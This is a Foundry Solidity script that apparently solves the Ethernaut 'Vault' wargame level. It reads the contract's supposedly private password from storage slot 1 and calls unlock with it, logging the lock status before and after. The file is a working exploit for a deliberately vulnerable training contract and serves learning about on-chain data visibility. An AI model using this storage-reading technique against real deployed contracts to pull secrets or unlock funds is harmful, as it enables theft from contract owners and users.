// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Script.sol";
import "instances/08_vault.sol";

interface CheatCodes {
    // Loads a storage slot from an address
    function load(address account, bytes32 slot) external returns (bytes32);
}

contract AttackerVaultScript is Script {
    address constant HEVM_ADDRESS = 0x7109709ECfa91a80626fF3989D68f67F5b1DD12D;
    CheatCodes constant cheats = CheatCodes(HEVM_ADDRESS);

    function run() external {
        Vault vault = Vault(vm.envAddress("INSTANCE"));

        vm.startBroadcast();

        bytes32 pass = cheats.load(address(vault), bytes32(uint256(1)));
        console.log("Vault pass :", uint256(pass));

        console.log("Vault status :", vault.locked());
        vault.unlock(pass);
        console.log("Vault status :", vault.locked());

        vm.stopBroadcast();
    }
}
